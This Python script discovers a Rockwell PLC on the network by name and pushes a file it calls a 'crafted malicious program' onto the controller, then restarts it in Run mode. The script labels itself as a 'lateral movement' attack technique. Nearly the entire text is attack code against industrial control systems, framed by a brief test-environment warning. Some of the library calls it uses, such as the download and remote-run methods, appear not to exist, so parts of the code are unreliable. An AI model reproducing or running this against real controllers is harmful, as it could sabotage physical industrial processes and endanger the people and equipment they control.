# Requires:
# - pycomm3 library (pip install pycomm3)
# - Access to the network where the PLC resides
# - Credentials (if required) to authenticate with the PLC.  This script assumes no credentials for simplicity. Adjust as needed.
# - The PLC must allow program downloads from the network (check PLC configuration).  Often this is disabled for security.
# - Knowledge of the target PLC's type and communication protocol.  This example assumes a Rockwell Automation PLC using Ethernet/IP.  Change the library and code accordingly for other PLCs.
# - A 'modified_program.L5X' (or equivalent, based on PLC type) file containing the malicious program to be downloaded. This file needs to be crafted specifically for the target PLC model and should be created with the official programming software (e.g., Studio 5000 for Rockwell).  **Creating this file is outside the scope of this script and requires expert PLC programming knowledge.**
# - An engineering workstation connected to the network with the PLC
# WARNING: Running this script can cause disruption or damage to the PLC and connected industrial processes. Use with extreme caution and only in a test environment.  The responsibility for any consequences lies solely with the user.

import sys
import os
import socket  # For finding PLC IP address
from pycomm3 import CIPDriver, LogixDriver  # For communicating with Rockwell PLCs via Ethernet/IP

# Configuration
PLC_NAME = "PLC-1"  # PLC name/Description
MODIFIED_PROGRAM_FILE = "modified_program.L5X"  # Path to the crafted malicious program file.  Replace with the actual file.
ABSOLUTE_PATH = os.path.dirname(__file__)
FULL_PROGRAM_PATH = os.path.join(ABSOLUTE_PATH, MODIFIED_PROGRAM_FILE) # getting the full path to the L5X file

def find_plc_ip_by_name(plc_name):
    """
    Finds the IP address of a PLC by its name on the local network
    using the CIP protocol.
    """
    try:
        with CIPDriver() as driver:
            devices = driver.discover()
            for device in devices:
                if plc_name in device.get('name', ''): # Check if the device name contains the specified PLC name
                    return device.get('host')
            print(f"PLC with name '{plc_name}' not found on the network.")
            return None
    except Exception as e:
        print(f"Error during PLC discovery: {e}")
        return None

def download_program_to_plc(plc_ip, program_file):
    """Downloads a program to a PLC via Ethernet/IP."""

    try:
        with LogixDriver(plc_ip) as plc:
            print(f"Connecting to PLC at {plc_ip}...")
            plc.open()  # Explicitly open the connection
            print("Connected to PLC.")

            # Before download, best practice is to check current mode
            # This can be integrated with the other MITRE techniques, but 
            # for simplicity, we assume the PLC is in a mode where download is possible.
            # In production environments, ALWAYS check the PLC mode and handle accordingly.
            # Example:
            # current_mode = plc.get_attribute_single("Program:MainProgram.MainRoutine.OperatingMode") # Attribute depends on your program and PLC
            # print(f"Current PLC Mode: {current_mode}")
            # if current_mode != "Remote Program":
            #   print("PLC is not in the correct mode for program download. Aborting.")
            #   return

            print(f"Downloading program from {program_file}...")

            # Download the program.  This will likely stop the PLC.
            # The actual method and arguments may differ based on pycomm3 version.
            try:
                plc.download(program_file)
            except Exception as e:
                print(f"Error during program download: {e}")
                return False

            print("Program download complete.")

            # Put the PLC back into Run mode (optional but often necessary)
            # The exact command depends on the PLC and desired operation.
            # This assumes Remote Run mode.  Adjust as required.
            try:
                plc.remote_run()  # Start the PLC in Run mode after download
            except Exception as e:
                print(f"Error putting PLC into Run mode: {e}")
                return False

            print("PLC is now in Run mode.")
            return True

    except Exception as e:
        print(f"Error connecting to or communicating with PLC: {e}")
        return False

if __name__ == "__main__":
    # Find the PLC's IP address based on its name
    plc_ip_address = find_plc_ip_by_name(PLC_NAME)

    if plc_ip_address:
        print(f"Found PLC '{PLC_NAME}' at IP address: {plc_ip_address}")
    else:
        print(f"Could not find PLC '{PLC_NAME}'.  Exiting.")
        sys.exit(1)


    # Check if the modified program file exists
    if not os.path.exists(FULL_PROGRAM_PATH):
        print(f"Error: Modified program file '{FULL_PROGRAM_PATH}' not found.")
        sys.exit(1)

    # Execute the program download
    if download_program_to_plc(plc_ip_address, FULL_PROGRAM_PATH):
        print("Lateral movement (Program Download) successful.")
    else:
        print("Lateral movement (Program Download) failed.")